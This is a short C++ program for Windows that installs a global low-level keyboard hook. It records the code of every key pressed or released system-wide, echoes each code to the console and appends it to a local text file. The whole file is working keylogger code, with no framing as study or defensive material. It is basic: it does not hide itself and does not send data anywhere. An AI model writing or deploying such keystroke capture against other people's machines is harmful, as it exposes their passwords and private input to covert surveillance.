#include <iostream>
#include <Windows.h>
#include <fstream>


std::ofstream fileStream;
// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboardHookStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (wParam == WM_KEYDOWN) {
            std::cout << "Key pressed: " << pKeyboardHookStruct->vkCode << std::endl;
        }
        else if (wParam == WM_KEYUP) {
            std::cout << "Key released: " << pKeyboardHookStruct->vkCode << std::endl;
        }
        fileStream.open("myfile.txt", std::ios::app);
        fileStream << pKeyboardHookStruct->vkCode << std::endl;
        fileStream.close();
    }
    // Call the next hook procedure in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Install the keyboard hook
    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hKeyboardHook == NULL) {
        std::cerr << "Failed to install keyboard hook" << std::endl;
        return 1;
    }
    // Run the message loop to process events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    // Uninstall the keyboard hook
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}